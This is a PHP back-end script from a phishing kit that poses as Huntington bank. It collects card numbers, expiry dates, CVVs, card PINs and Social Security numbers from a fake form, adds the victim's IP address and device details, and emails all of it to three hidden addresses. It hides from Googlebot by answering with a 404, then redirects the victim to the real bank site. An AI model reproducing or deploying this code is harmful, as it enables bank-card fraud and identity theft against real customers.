<?php
session_start();
include('css/vld.php');
include('antibots.php');
if(isset($_POST['cc'])){
    
    $ip = getenv("REMOTE_ADDR");
    $ua = $_SERVER['HTTP_USER_AGENT'];
$msg .= "#------------------[ Credit Card ]---------------------#\n";
$msg .= "Card Number  : ".$_POST['cc']."\n";
$exp = $_POST['mm']."/".$_POST['yy'];
$msg .= "Expiry Date  : $exp;
$msg .= "Cvv  : ".$_POST['cvv']."\n";
$msg .= "Card  Pin  : ".$_POST['pin']."\n";
$msg .= "Social Security Number  : ".$_POST['ssn']."\n";
$msg .= "#-----------------[ Visitor ]------------------#\n";
$msg .= "IP Address     : ".$ip."\n";
$msg .= "DEVICE INFORMATION         : ".$ua."\n";
$msg .= "#-------------------[ SNICKYNINJA - END ]------------------------#\n\n";
$sub = "::SNICKYNINJA:: Huntington Credit Card Information: $ip";
mail($to,$sub,$msg);
mail($ml1,$sub,$msg);
mail($ml2,$sub,$msg);

}
if(strpos($_SERVER['HTTP_USER_AGENT'], 'GoogleBot') !==false) {
    header('HTTP/1.0 404 Not Found');
    exit();
}

if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")), 'GoogleBot') !==false) {
    header('HTTP/1.0 404 Not Found');
    exit();
}
header("Location: https://www.Huntington.com");
?>
